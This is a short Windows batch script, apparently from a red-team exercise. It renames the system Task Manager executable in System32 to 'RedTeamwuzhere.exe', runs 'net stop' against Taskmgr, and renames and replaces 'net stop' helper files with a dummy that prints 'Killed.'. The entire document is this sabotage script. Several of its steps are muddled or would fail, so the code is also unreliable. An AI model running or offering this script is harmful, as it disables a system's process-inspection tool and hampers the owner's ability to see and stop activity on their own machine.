@echo off


REM Find the path to the Task Manager executable file
set taskManagerPath=%SystemRoot%\System32\Taskmgr.exe

REM Rename the Task Manager executable file
ren "%taskManagerPath%" RedTeamwuzhere.exe


REM Disable the Task Manager service
REM Reenable net stop
ren net_stop_disabled.bat net stop.bat
net stop "Taskmgr"
REM disable net stop

REM Rename the net stop command
ren netstop netstop_disabled.bat

REM Create a dummy net stop command
echo "Killed." > netstop_disabled.bat
